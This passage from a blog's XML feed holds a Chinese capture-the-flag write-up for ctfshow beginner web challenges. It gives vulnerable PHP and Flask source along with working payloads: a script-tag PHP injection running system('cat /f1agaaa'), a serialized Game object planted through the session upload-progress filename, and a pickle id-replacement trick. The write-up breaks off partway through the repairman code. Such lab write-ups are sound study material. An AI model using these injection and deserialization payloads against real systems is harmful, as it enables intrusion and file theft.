href="https://www.cnblogs.com/iini/p/12334646.html">https://www.cnblogs.com/iini/p/12334646.html</a></p><p>2.<a href="http://www.javashuo.com/article/p-ajgbndml-nv.html">http://www.javashuo.com/article/p-ajgbndml-nv.html</a></p><p>3.<a href="https://blog.csdn.net/linan101/article/details/110478851">https://blog.csdn.net/linan101/article/details/110478851</a></p><p>4.<a href="https://blog.csdn.net/m0_37621078/article/details/107697019">https://blog.csdn.net/m0_37621078/article/details/107697019</a></p><p>5.<a href="https://www.cnblogs.com/ethan-yan/p/14681938.html">https://www.cnblogs.com/ethan-yan/p/14681938.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 日常学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BLE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow新手杯 部分WP</title>
      <link href="/2022/10/05/ctfshow-xin-shou-bei-bu-fen-wp/"/>
      <url>/2022/10/05/ctfshow-xin-shou-bei-bu-fen-wp/</url>
      
        <content type="html"><![CDATA[<blockquote><p>我确实是新手。</p></blockquote><h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="easy-eval"><a href="#easy-eval" class="headerlink" title="easy_eval"></a>easy_eval</h4><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$code</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"?"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"?>"</span><span class="token punctuation">.</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//中止</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>?&gt;提前中止php，后面就不会执行代码了。因此$code需要传一个php标签，但str_replace过滤了问号。考虑用script风格标签。一开始没想到script风格标签导致卡了很久555。</p><p>payload:</p><pre class="line-numbers language-javascript"><code class="language-javascript">code<span class="token operator">=</span><span class="token operator">&lt;</span>script language<span class="token operator">=</span><span class="token string">"php"</span><span class="token operator">></span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">'cat /f1agaaa'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20221005221523758.png" alt="image-20221005221523758" style="zoom:50%;" /><h4 id="剪刀石头布"><a href="#剪刀石头布" class="headerlink" title="剪刀石头布"></a>剪刀石头布</h4><p>连续猜拳赢100次得到flag（耍你的</p><p>审计代码：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">'session.serialize_handler'</span><span class="token punctuation">,</span> <span class="token string">'php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'source'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">include</span> <span class="token string">"flag.php"</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name">Game</span><span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token variable">$log</span><span class="token punctuation">,</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token variable">$play</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">log</span> <span class="token operator">=</span> <span class="token string">'/tmp/'</span><span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'.log'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">//略</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token string">"&lt;h5>Game History&lt;/h5>\n"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;div class='all_output'>\n"</span><span class="token punctuation">;</span>                <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">log</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;/div>"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?php</span>    <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'win'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token delimiter">?></span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token delimiter">&lt;?php</span> <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token delimiter">?></span>    <span class="token delimiter">&lt;?php</span>    <span class="token variable">$choices</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"Rock"</span><span class="token punctuation">,</span> <span class="token string">"Paper"</span><span class="token punctuation">,</span> <span class="token string">"Scissors"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$rand_bot</span> <span class="token operator">=</span> <span class="token function">array_rand</span><span class="token punctuation">(</span><span class="token variable">$choices</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$bot_input</span> <span class="token operator">=</span> <span class="token variable">$choices</span><span class="token punctuation">[</span><span class="token variable">$rand_bot</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"choice"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">AND</span> <span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"choice"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$choices</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$user_input</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"choice"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$result</span><span class="token operator">=</span><span class="token variable">$Game</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">play</span><span class="token punctuation">(</span><span class="token variable">$user_input</span><span class="token punctuation">,</span><span class="token variable">$bot_input</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token operator">==</span><span class="token string">"You Win"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'win'</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'win'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token delimiter">?></span>        <span class="token comment" spellcheck="true">//...</span>        <span class="token delimiter">&lt;?php</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"flag"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'win'</span><span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token string">"&lt;div>You need to win 100 rounds in a row to get flag.&lt;/div>"</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token string">"Here is your flag:"</span><span class="token punctuation">.</span><span class="token variable">$flag</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里有一个很刻意的指出了ini_set(‘session.serialize_handler’, ‘php’);序列化handler可控，并且发现<strong>session.upload_progress.name</strong>为PHP_SESSION_UPLOAD_PROGRESS，很明显的phpsession差异导致的反序列化。</p><p>php中的session中的内容并不是放在内存中的，而是以文件的方式来存储的，存储方式就是由配置项<code>session.save_handler</code>来进行确定的，默认是以文件的方式存储。</p><p>如果在PHP在反序列化存储的$_SESSION数据时使用的引擎和序列化使用的引擎不一样，会导致安全问题。</p><p>这是因为当使用php引擎的时候，php引擎会以**|**作为key和value的分隔符。</p><p><a href="https://blog.spoock.com/2016/10/16/php-serialize-problem/">以上内容节选自spoock师傅</a>.</p><p>以这道题为例。</p><p>由于session.upload_progress.name为PHP_SESSION_UPLOAD_PROGRESS，那么该session文件的内容是可控的，就是POST的filename。</p><p>上传页面：</p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://a188d7a8-2a27-4c8f-bdb0-da187c09c567.challenge.ctf.show/<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>PHP_SESSION_UPLOAD_PROGRESS<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>123<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结合Game类的代码，我们把log设置为flag.php即可，序列化生成：</p><p>O:4:&quot;Game&quot;:2:{s:3:&quot;log&quot;;s:8:&quot;flag.php&quot;;s:4:&quot;name&quot;;s:8:&quot;Squirt1e&quot;;}</p><p>filename赋值为|O:4:&quot;Game&quot;:2:{s:3:&quot;log&quot;;s:8:&quot;flag.php&quot;;s:4:&quot;name&quot;;s:8:&quot;Squirt1e&quot;;}。、php引擎会以**|**作为key和value的分隔符</p><p>也就是’s:6:&quot;Squirt1e”;s:67:”‘&#x3D;&gt;’O:4:&quot;Game&quot;:2:{s:3:&quot;log&quot;;s:8:&quot;flag.php&quot;;s:4:&quot;name&quot;;s:8:&quot;Squirt1e&quot;;}’，从而在析构函数读取flag。</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20221005224014534.png" alt="image-20221005224014534" style="zoom: 33%;" /><h4 id="baby-pickle"><a href="#baby-pickle" class="headerlink" title="baby_pickle"></a>baby_pickle</h4><pre class="line-numbers language-python"><code class="language-python">app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>id <span class="token operator">=</span> <span class="token number">0</span>flag <span class="token operator">=</span> <span class="token string">"ctfshow{"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>uuid<span class="token punctuation">.</span>uuid4<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"}"</span><span class="token keyword">class</span> <span class="token class-name">Rookie</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> name<span class="token punctuation">,</span> id<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>name <span class="token operator">=</span> name        self<span class="token punctuation">.</span>id <span class="token operator">=</span> id@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">agent_show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> id    id <span class="token operator">=</span> id <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        name <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        name <span class="token operator">=</span> <span class="token string">"new_rookie"</span>    new_rookie <span class="token operator">=</span> Rookie<span class="token punctuation">(</span>name<span class="token punctuation">,</span> id<span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        file <span class="token operator">=</span> open<span class="token punctuation">(</span>str<span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"_info"</span><span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span>        info <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>new_rookie<span class="token punctuation">,</span> protocol<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>        info <span class="token operator">=</span> pickletools<span class="token punctuation">.</span>optimize<span class="token punctuation">(</span>info<span class="token punctuation">)</span>        file<span class="token punctuation">.</span>write<span class="token punctuation">(</span>info<span class="token punctuation">)</span>        file<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"error"</span>    <span class="token keyword">with</span> open<span class="token punctuation">(</span>str<span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"_info"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> file<span class="token punctuation">:</span>        user <span class="token operator">=</span> pickle<span class="token punctuation">.</span>load<span class="token punctuation">(</span>file<span class="token punctuation">)</span>    message <span class="token operator">=</span> user<span class="token punctuation">.</span>name <span class="token operator">+</span> <span class="token string">"&lt;/h1>\n&lt;p>"</span> <span class="token operator">+</span> <span class="token string">"只有成为大菜鸡才能得到flag"</span>    <span class="token keyword">return</span> message@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">"/dacaiji"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    name <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span>    <span class="token keyword">with</span> open<span class="token punctuation">(</span>str<span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"_info"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        user <span class="token operator">=</span> pickle<span class="token punctuation">.</span>load<span class="token punctuation">(</span>f<span class="token punctuation">)</span>    <span class="token keyword">if</span> user<span class="token punctuation">.</span>id <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>        message <span class="token operator">=</span> <span class="token string">"你不是大菜鸡"</span>        <span class="token keyword">return</span> message    <span class="token keyword">else</span><span class="token punctuation">:</span>        message <span class="token operator">=</span> <span class="token string">"恭喜你成为大菜鸡"</span> <span class="token operator">+</span> flag        <span class="token keyword">return</span> message@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">"/change"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">change_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    name <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    newname <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"newname"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    file <span class="token operator">=</span> open<span class="token punctuation">(</span>name<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"_info"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span>    info <span class="token operator">=</span> file<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"old_info ===================="</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>info<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"name ===================="</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"newname ===================="</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>newname<span class="token punctuation">)</span>    info <span class="token operator">=</span> info<span class="token punctuation">.</span>replace<span class="token punctuation">(</span>name<span class="token punctuation">,</span> newname<span class="token punctuation">)</span> <span class="token operator">//</span><span class="token operator">*</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>info<span class="token punctuation">)</span>    file<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">with</span> open<span class="token punctuation">(</span>name<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span> <span class="token string">"_info"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>info<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">"success"</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8888</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>非预期了。pickle反序列化。然后注意到了info &#x3D; info.replace(name, newname)，只要让user.id&#x3D;0即可，假设第一次默认路由让id&#x3D;1，那么注册一个name&#x3D;2的用户，然后通过&#x2F;change改成0即可替换掉user.id。</p><p>注册用户2。</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20221005225054520.png" alt="image-20221005225054520" style="zoom:50%;" /><p>修改用户名，注意base编码。</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20221005225158916.png" alt="image-20221005225158916" style="zoom:50%;" /><p>访问&#x2F;dacaiji，这里没想明白为啥name没被替换成0。</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20221005225223114.png" alt="image-20221005225223114" style="zoom:50%;" /><h4 id="repairman"><a href="#repairman" class="headerlink" title="repairman"></a>repairman</h4><p>hello,the user!We may change the mode to repaie the server,please keep it unchanged</p><p>让mode&#x3D;0，看到了代码。</p><pre class="line-numbers language-php"><code class="language-php">Your mode is the guest<span class="token operator">!</span>hello<span class="token punctuation">,</span>the repairman<span class="token operator">!</span> <span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'secret'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">Array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token string">'config.php'</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'secret'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$secret</span> <span class="token operator">=</span><span class="token operator">&amp;</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'secret'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token variable">$secret</span> <span class="token operator">=</span> <span class="token keyword">Null</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$mode</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REQUEST_URI'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">[</span><span class="token string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$mode</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">'Your mode is the guest!'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">cmd</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">global</span> <span class="token variable">$secret</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">'Sucess change the ini!The logs record you!'</span><span class="token punctuation">;</span>    <span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$secret</span><span class="token punctuation">[</span><span class="token string">'secret'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$secret</span><span class="token punctuation">;</span>    <span class="token variable">$secret</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'secret'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$secret</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$mode</span> <span class="token operator">==</span> <span class="token string">'0'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//echo var_dump($GLOBALS);</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$secret</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token string">'token'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$secret</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">.</span><span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'secret'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    